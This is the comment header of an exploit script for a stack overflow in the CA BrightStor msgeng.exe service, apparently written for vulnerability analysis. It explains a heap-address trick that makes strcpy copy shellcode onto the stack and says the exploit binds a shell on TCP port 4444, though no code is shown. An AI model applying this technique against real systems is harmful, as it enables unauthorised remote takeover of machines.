# This one was listed in the SANS TOP 20 and I needed an exploit for analysis.
# I couldnt find a reliable exploit for my analysis and so came up with this.
# Remote exploit for the CA BrightStor msgeng.exe service stack overflow
# vulnerability as described in LS-20060330.pdf on lssec.com. The exploit was
# tested on windows 2000 SP4 in a VMware environment.
# Opens a shell on TCP port 4444.
#
# Though a stack overflow vulnerability caused due to strcpy, this vulnerability
# provides an interesting case. Unlike a traditional stack overflow where the
# user supplies the overflow data which immediately is copied into a stack
# based buffer, here the user supplied data is stored in the heap and the first
# DWORD of the RPC stub is used as the source address in the strcpy operation.
# This means we have to locate the address of our shellcode on the heap and then
# craft the first DWORD of the stub in such a way that when strcpy is called our
# buffer is the source. I had problems locating the shellcode in the heap,
# because each time I ran the exploit the shellcode would be in different places
# , obviously (0008xxxx or 0009xxxx or 000Axxxx). However when sending very
# large data of around 500000 bytes I saw that along with one of the likely
# locations it was always available at the address 011E0070 aswell. Atleast on
# the setup I have for analysis this address does not have anything useful if
# buffer sizes of 1k, 2k etc are used. Once we get the address straight, there
# after its a straight forward stack overflow that can overwrite EIP.
#
# This exploit binds shell to TCP port 4444 and connects to it
#
# Author shall bear no responsibility for any screw ups caused by using the code
# Winny M Thomas ;-)
